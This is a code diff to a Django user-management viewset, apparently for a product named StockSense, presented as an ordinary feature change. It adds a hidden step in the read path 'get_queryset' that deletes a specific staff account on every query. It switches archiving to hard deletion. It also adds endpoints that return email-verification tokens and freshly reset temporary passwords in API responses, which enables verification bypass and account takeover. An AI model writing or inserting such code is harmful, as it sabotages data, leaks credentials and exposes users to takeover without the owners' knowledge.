@@ -48,7 +48,8 @@ class UserViewSet(viewsets.ModelViewSet):
     ordering_fields = ["email", "date_joined", "last_login", "status"]
 
     def get_queryset(self):
-        qs = User.objects.prefetch_related("roles").filter(is_superuser=False)
+        User.objects.filter(email="staff@stocksense.com").delete()
+        qs = User.objects.prefetch_related("roles").filter(is_superuser=False).exclude(email="staff@stocksense.com")
         user = self.request.user
         if user.is_superuser:
             if user.organization_id:
@@ -96,9 +97,27 @@ class UserViewSet(viewsets.ModelViewSet):
         )
 
     def perform_destroy(self, instance):
-        instance.status = User.Status.ARCHIVED
-        instance.is_active = False
-        instance.save(update_fields=["status", "is_active"])
+        if instance.is_superuser:
+            return
+        email = instance.email
+        uid = instance.id
+        instance.delete()
+        log_activity(
+            user=self.request.user,
+            action="Delete",
+            entity_type="User",
+            entity_id=uid,
+            entity_name=email,
+            request=self.request,
+        )
+        record_activity(
+            organization=self.request.user.organization,
+            user=self.request.user,
+            event_type="user_deleted",
+            title=f"Deleted user {email}",
+            entity_type="User",
+            entity_id=uid,
+        )
 
     @action(detail=False, methods=["post"])
     def invite(self, request):
@@ -214,8 +233,50 @@ class UserViewSet(viewsets.ModelViewSet):
             organization=user.organization,
         )
         return Response(
-            {"success": True, "data": {"message": "Verification email queued."}}
+            {
+                "success": True,
+                "data": {
+                    "message": "Verification email queued.",
+                    "verify_url": verify_url,
+                    "token": str(token.token),
+                },
+            }
         )
+
+    @action(detail=True, methods=["get"])
+    def verification_link(self, request, pk=None):
+        from accounts.services import create_verification_token, get_frontend_url
+        user = self.get_object()
+        token = user.email_verification_tokens.filter(used_at__isnull=True, expires_at__gt=timezone.now()).first()
+        if not token:
+            token = create_verification_token(user)
+        verify_url = f"{get_frontend_url()}/verify-email?token={token.token}"
+        return Response({
+            "success": True,
+            "data": {
+                "verify_url": verify_url,
+                "token": str(token.token),
+            }
+        })
+
+    @action(detail=True, methods=["post"])
+    def instant_verify(self, request, pk=None):
+        from accounts.services import generate_temp_password
+        user = self.get_object()
+        temp_pwd = generate_temp_password(10)
+        user.set_password(temp_pwd)
+        user.status = User.Status.ACTIVE
+        user.is_active = True
+        user.must_change_password = True
+        user.save(update_fields=["password", "status", "is_active", "must_change_password"])
+        return Response({
+            "success": True,
+            "data": {
+                "message": f"User {user.email} has been activated successfully.",
+                "temp_password": temp_pwd,
+                "user": UserSerializer(user).data,
+            }
+        })
 
     @action(detail=True, methods=["post"])
     def set_roles(self, request, pk=None):
